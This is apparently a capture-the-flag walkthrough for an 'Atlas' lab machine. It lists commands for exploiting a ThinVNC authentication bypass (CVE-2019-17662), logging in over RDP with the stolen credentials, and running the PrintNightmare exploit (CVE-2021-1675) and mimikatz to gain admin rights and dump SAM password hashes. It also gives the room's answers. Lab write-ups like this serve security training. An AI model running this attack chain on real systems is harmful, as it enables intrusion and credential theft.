# Atlas - Easy

```shell
nmap -T4 -A -Pn -v 10.10.14.130

curl 10.10.14.130:8080 -v

#get exploit from GitHub
chmod +x CVE-2019-17662.py

./CVE-2019-17662.py

./CVE-2019-17662.py -h

./CVE-2019-17662.py 10.10.14.130 8080

xfreerdp /v:10.10.14.130 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
#/drive:share,tmp lets us share our /tmp directory with target

#download CVE-2021-1675.ps1 in /tmp in attacker machine

#in victim rdp, open powershell
. \\tsclient\share\CVE-2021-1675.ps1
#this imports the .ps1

#run exploit
Invoke-Nightmare
#creates new user

Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
#use new user creds to spawn cmd.exe

whoami /groups
#part of BUILTIN\Administrators

#download mimikatz_trunk.zip in /tmp
#in attacker machine
unzip mimikatz_trunk.zip

#in victim rdp session
\\tsclient\share\x64\mimikatz.exe
#executes mimikatz

privilege::debug
#'20' OK

token::elevate

#dump hashes
lsadump::sam
```

* Open ports & services:

  * 3389 - ms-wbt-server
  * 8080 - http-proxy

* We can try accessing the webpage on port 8080 - this gives us a prompt for basic authentication.

* We do not know the creds, so we can attempt to send a request using ```cURL``` to check for clues.

* Using ```cURL```, we can see that the webpage is for 'ThinVNC' - we can check if any exploits exist for this.

* We get a ThinVNC authentication bypass exploit, for CVE-2019-17662.

* We get the Python script for the exploit from Github; running the script with the required parameters fetches creds from ThinVnc.ini

* We have the creds Atlas:H0ldUpTheHe@vens; we can log into the website now.

* With ThinVNC, we can access the victim machine's Desktop by submitting its IP as input.

* However, it is not easy to use, so we can try to reuse the same creds for ```xfreerdp```, and it works.

* We are given a clue about the PrintSpooler exploit covered in CVE-2021-1675 - we can download the .ps1 exploit script and move it to /tmp in attacker machine.

* In victim machine, we can open PowerShell and run the exploit script.

* This creates a new user adm1n:P@ssw0rd with local admin privileges.

* We can spawn a new cmd.exe as the new user.

* Using ```mimikatz```, we can dump hashes now.

```markdown
1. With the Nmap default port range, you should find that two ports are open. What port numbers are these? - 3389,8080

2. What service does Nmap think is running on the higher of the two ports? - http-proxy

3. What is the Administrator account's NTLM password hash? - c16444961f67af7eea7e420b65c8c3eb
```
